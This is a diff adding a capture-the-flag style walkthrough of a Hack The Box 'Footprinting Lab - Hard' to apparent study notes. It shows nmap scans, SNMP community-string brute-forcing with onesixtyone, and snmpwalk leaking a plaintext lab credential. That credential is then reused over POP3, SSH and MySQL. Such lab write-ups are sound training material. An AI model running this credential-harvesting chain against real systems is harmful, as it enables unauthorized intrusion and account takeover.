@@ -14,6 +14,7 @@
 11. [IPMI](#ipmi)
 12. [Footprinting Lab - Easy](#footprinting-lab---easy)
 13. [Footprinting Lab - Medium](#footprinting-lab---medium)
+14. [Footprinting Lab - Hard](#footprinting-lab---hard)
 
 ---
 # FTP
@@ -1343,3 +1344,109 @@
     xfreerdp /v:10.129.196.58 /u:Administrator /p:'87N1ns@slls83'
     ```
     In there we can find HTB user with its password.
+
+# Footprinting Lab - Hard
+## Challenges
+
+1. Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.
+
+    First we enumerate using standard nmap option. 
+    ```bash
+    nmap -sV -sC 10.129.7.30 -v
+    ```
+
+    Here the output.
+    ```bash
+    PORT      STATE    SERVICE       VERSION
+    22/tcp    open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
+    |   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
+    |_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
+    110/tcp   open     pop3          Dovecot pop3d
+    | ssl-cert: Subject: commonName=NIXHARD
+    | Subject Alternative Name: DNS:NIXHARD
+    | Issuer: commonName=NIXHARD
+    | Public Key type: rsa
+    | Public Key bits: 2048
+    | Signature Algorithm: sha256WithRSAEncryption
+    | Not valid before: 2021-11-10T01:30:25
+    | Not valid after:  2031-11-08T01:30:25
+    | MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
+    |_SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
+    |_pop3-capabilities: STLS TOP PIPELINING USER CAPA RESP-CODES AUTH-RESP-CODE UIDL SASL(PLAIN)
+    143/tcp   open     imap          Dovecot imapd (Ubuntu)
+    |_imap-capabilities: STARTTLS IDLE LOGIN-REFERRALS Pre-login more LITERAL+ ENABLE have post-login listed OK SASL-IR IMAP4rev1 AUTH=PLAINA0001 ID capabilities
+    |_ssl-date: TLS randomness does not represent time
+    993/tcp   open     ssl/imap      Dovecot imapd (Ubuntu)
+    | ssl-cert: Subject: commonName=NIXHARD
+    | Subject Alternative Name: DNS:NIXHARD
+    | Issuer: commonName=NIXHARD
+    | Public Key type: rsa
+    | Public Key bits: 2048
+    | Signature Algorithm: sha256WithRSAEncryption
+    | Not valid before: 2021-11-10T01:30:25
+    | Not valid after:  2031-11-08T01:30:25
+    | MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
+    |_SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
+    |_imap-capabilities: IDLE LOGIN-REFERRALS Pre-login more LITERAL+ ENABLE have post-login listed OK SASL-IR IMAP4rev1 AUTH=PLAINA0001 ID capabilities
+    |_ssl-date: TLS randomness does not represent time
+    995/tcp   open     ssl/pop3      Dovecot pop3d
+    |_pop3-capabilities: USER CAPA SASL(PLAIN) RESP-CODES TOP AUTH-RESP-CODE PIPELINING UIDL
+    |_ssl-date: TLS randomness does not represent time
+    | ssl-cert: Subject: commonName=NIXHARD
+    | Subject Alternative Name: DNS:NIXHARD
+    | Issuer: commonName=NIXHARD
+    | Public Key type: rsa
+    | Public Key bits: 2048
+    | Signature Algorithm: sha256WithRSAEncryption
+    | Not valid before: 2021-11-10T01:30:25
+    | Not valid after:  2031-11-08T01:30:25
+    | MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
+    |_SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
+    2119/tcp  filtered gsigatekeeper
+    2809/tcp  filtered corbaloc
+    44176/tcp filtered unknown
+    ```
+    Based on the output, we can see it have ssh, imap, pop3 service running. I tried to use openssl but nothing useful. So i tried to enumerate again on UDP.
+
+    ```bash
+    sudo nmap -sV --top-port 100 -sU 10.129.7.30 -v 
+    ```
+
+    Here the result.
+
+    ```bash
+    PORT      STATE         SERVICE VERSION
+    68/udp    open|filtered dhcpc
+    161/udp   open          snmp    net-snmp; net-snmp SNMPv3 server
+    49186/udp open|filtered unknown
+    ```
+    We can see it have snmp service. Then we tried to get the community string using onesixtyone.
+
+    ```bash
+    onesixtyone -c /home/mrwhok/tools/SecLists/Discovery/SNMP/snmp.txt 10.129.7.30
+    ```
+
+    Here the result.
+    ```bash
+    Scanning 1 hosts, 3219 communities
+    10.129.7.30 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
+    ```
+    We found that the community string is backup. Then we tried to use snmpwalk to enumerate again.
+
+    ```bash
+    snmpwalk -v2c -c backup 10.129.7.30
+    ```
+
+    In there we can find username and password.
+    ```bash
+    STRING: "tom NMds732Js2761"
+    ```
+    With that credential, we tried to login in the telnet with port 110. After login, we can get ssh key by enter `RETR 1`. By using it, we can do ssh. In the `/etc/passwd`, we can see this `mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false`. Then we use tom credential, doing this.
+
+    ```bash
+    mysql -u tom -p
+    ```
+
+    In there, we can get password for HTB user.
